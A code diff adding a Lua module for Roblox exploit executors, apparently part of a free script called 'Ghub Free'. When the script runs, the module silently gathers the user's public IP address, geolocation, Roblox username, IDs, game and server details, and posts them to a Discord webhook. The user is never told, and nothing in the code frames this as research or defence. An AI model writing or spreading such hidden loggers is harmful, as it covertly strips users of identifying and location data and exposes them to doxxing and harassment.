@@ -1,0 +1,201 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local SCRIPT_NAME = "Ghub Free"
+local COUNT_FILE = "GHFree.txt"
+
+return function(WEBHOOK_URL)
+    local function httpRequest(url)
+        local req = (syn and syn.request)
+            or (http and http.request)
+            or request
+            or http_request
+            or (fluxus and fluxus.request)
+
+        if not req then
+            return nil
+        end
+
+        local ok, res = pcall(function()
+            return req({
+                Url = url,
+                Method = "GET",
+                Headers = {["User-Agent"] = "Mozilla/5.0"}
+            })
+        end)
+
+        if ok and res and (res.Success or res.StatusCode == 200) then
+            return res.Body or res.body
+        end
+        return nil
+    end
+
+    -- ===== USE COUNT (file) =====
+    local function getUseCount()
+        local count = 0
+        if isfile and isfile(COUNT_FILE) then
+            local ok, data = pcall(readfile, COUNT_FILE)
+            if ok and data then
+                count = tonumber(data) or 0
+            end
+        end
+        count = count + 1
+        if writefile then
+            pcall(writefile, COUNT_FILE, tostring(count))
+        end
+        return count
+    end
+
+    -- ===== LOKASI + IP =====
+    local function getLocation()
+        -- ip-api.com (gratis, tanpa key)
+        local body = httpRequest("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,query")
+        if body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(body)
+            end)
+            if ok and data and data.status == "success" then
+                local country = data.country or "Unknown"
+                local code = data.countryCode or "??"
+                local city = data.city or data.regionName or "Unknown"
+                local ip = data.query or "Unknown"
+                return string.format("%s (%s) | %s | IP: %s", country, code, city, ip)
+            end
+        end
+
+        -- fallback ipinfo
+        body = httpRequest("https://ipinfo.io/json")
+        if body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(body)
+            end)
+            if ok and data then
+                local country = data.country or "??"
+                local city = data.city or data.region or "Unknown"
+                local ip = data.ip or "Unknown"
+                return string.format("%s | %s | IP: %s", country, city, ip)
+            end
+        end
+
+        return "Unknown | Unknown | IP: Unknown"
+    end
+
+    local function getGameName()
+        local ok, info = pcall(function()
+            return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+        end)
+        if ok and info then
+            return info.Name
+        end
+        return "Unknown Game"
+    end
+
+    local function getServerType()
+        if game.PrivateServerId and game.PrivateServerId ~= "" then
+            return "Private Server"
+        end
+        return "Public Server"
+    end
+
+    -- Ambil URL avatar yang valid buat Discord
+    local function getAvatarUrl(userId)
+        local body = httpRequest(
+            "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
+            .. tostring(userId)
+            .. "&size=420x420&format=Png&isCircular=false"
+        )
+        if body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(body)
+            end)
+            if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+                return data.data[1].imageUrl
+            end
+        end
+        -- fallback full body
+        body = httpRequest(
+            "https://thumbnails.roblox.com/v1/users/avatar?userIds="
+            .. tostring(userId)
+            .. "&size=420x420&format=Png&isCircular=false"
+        )
+        if body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(body)
+            end)
+            if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+                return data.data[1].imageUrl
+            end
+        end
+        return nil
+    end
+
+    local function sendLogger()
+        local useCount = getUseCount()
+        local lokasi = getLocation()
+        local username = LocalPlayer.Name
+        local userId = tostring(LocalPlayer.UserId)
+        local displayName = LocalPlayer.DisplayName
+        local placeId = tostring(game.PlaceId)
+        local jobId = game.JobId
+        local gameName = getGameName()
+        local sea = ""
+        if sea ~= "" then
+            gameName = gameName
+        end
+        local serverType = getServerType()
+        local timeStr = os.date("%Y-%m-%d %H:%M:%S")
+
+        local avatarUrl = getAvatarUrl(userId)
+
+        local embedFields = {
+            {name = "Username", value = "```" .. username .. "```", inline = true},
+            {name = "UserId", value = "```" .. userId .. "```", inline = true},
+            {name = "DisplayName", value = "```" .. displayName .. "```", inline = true},
+            {name = "Pemakaian ke-", value = "```" .. tostring(useCount) .. "```", inline = true},
+            {name = "Game", value = "```" .. gameName .. "```", inline = true},
+            {name = "PlaceId", value = "```" .. placeId .. "```", inline = true},
+            {
+                name = "Server",
+                value = serverType == "Private Server" and "🔒 **Private Server**" or "🌐 **Public Server**",
+                inline = false
+            },
+            {name = "Lokasi (perkiraan)", value = "```" .. lokasi .. "```", inline = false},
+            {name = "JobId", value = "```" .. jobId .. "```", inline = false}
+        }
+
+        local embed = {
+            username = "Log Data!",
+            embeds = {{
+                author = {
+                    name = "Script Logger APP",
+                    icon_url = avatarUrl
+                },
+                title = "Information",
+                color = 0x5865F2,
+                fields = embedFields,
+                footer = {
+                    text = SCRIPT_NAME .. " • " .. timeStr
+                },
+                timestamp = DateTime.now():ToIsoDate()
+            }}
+        }
+
+        if avatarUrl then
+            embed.embeds[1].thumbnail = { url = avatarUrl }
+        end
+
+        local json = HttpService:JSONEncode(embed)
+        local req = (syn and syn.request) or (http and http.request) or request or http_request
+        if req then
+            pcall(function()
+                req({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = json
+                })
+            end)
+        end
+    end
+    sendLogger()
+end
